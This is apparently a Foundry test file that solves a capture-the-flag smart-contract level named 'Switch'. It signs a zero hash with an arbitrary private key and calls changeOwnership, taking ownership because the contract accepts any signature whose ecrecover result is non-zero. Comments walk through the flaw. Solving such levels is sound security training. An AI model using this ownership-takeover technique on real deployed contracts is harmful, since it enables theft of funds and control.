// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./utils/BaseTest.sol";
import "src/Switch.sol";

contract SwitchTest is BaseTest {
    Switch private level;

    constructor() {
        string[] memory userLabels = new string[](1);
        userLabels[0] = "Player";
        preSetUp(1, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        level = Switch(payable(0xa5343165d51Ea577d63e1a550b1F3c872ADc58e4));
        // level = new Switch();
        vm.label(address(level), "Switch");

        // Assert that the deployer is the owner of the contract
        assertEq(level.owner(), 0x534DBE4e23E48faC59847F120a80A83F764a381F);
    }

    function testCompleteLevel() public {
        address player = users[0];
        vm.startPrank(player);

        // I know it's strange I'm using a random private key and a random address
        // to be used to construct the hash to be signed and then passed to the `changeOwnership` function
        // I wanted to be very explicity that I can use whathever I want as inputs of those function
        // To explain that for this exploit you just need to have a "valid" hashed message that has been signed
        // correctly by an arbitrary private key
        // The only important thing for the `changeOwnership` function is that the
        // `ecrecover` does not return `address(0)` that usually is when there's an error/signature mismatch
        // I would assume that any `v`, `r`, and `s` valid values would make the `ecrecover` function
        // return something valid (not `address(0)`)
        uint256 privateKey = 123456;
        bytes32 hashedMessage = bytes32(0);

        // sign the hashed message
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hashedMessage);

        // exploit the level
        level.changeOwnership(v, r, s);

        vm.stopPrank();

        // Assert that the level has completed
        assertEq(level.owner(), player);
    }
}
